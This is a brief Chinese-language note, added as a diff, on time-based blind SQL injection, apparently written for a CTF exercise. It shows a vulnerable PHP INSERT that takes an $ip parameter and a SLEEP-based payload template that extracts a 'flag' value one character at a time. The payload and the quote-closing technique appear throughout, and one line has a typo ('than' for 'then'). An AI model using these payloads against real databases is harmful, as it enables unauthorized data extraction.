@@ -1,0 +1,30 @@
+﻿基于时间的盲注入
+Select sleep（N）可以让此语句运行n秒钟。
+select sleep(10),name from guestbook where name = 'test';
+
+11'+(select case when (substring((select flag from flag ) from {0} for 1 )='{1}') then sleep(5) else 1 end ) and '1'='1
+
+$sql="insert into client_ip (ip) values ('11'+(select case when (substring((select flag from flag ) from {0} for 1 )='{1}') then sleep(5) else 1 end ) and '1'='1')".format(str(i),str1)
+
+select case when (substring   ( (select flag from flag) from {0} for 1) = '{1}'   ) 
+
+than sleep(5) else 1 end ）and '1'='1')；
+
+$sql="insert into client_ip (ip) values ('$ip')";
+mysql_query($sql);
+
+payload 
+
+可控参数为$ip
+
+要构成完整的sql查询语句首先需要闭合 ('  ')";
+
+这里我们进行处理（'1'   and'1'='1')"
+
+substring((select flag from flag ) from {0} for 1 )='{1}'
+flag 的第几位是否等于遍历的allstring
+如果是的话就sleep(5)
+
+
+
+insert into client_ip (ip) values ('11'+(select case when (substring((select flag from flag ) from {0} for 1 )='{1}') then sleep(5) else 1 end ) and '1'='1')
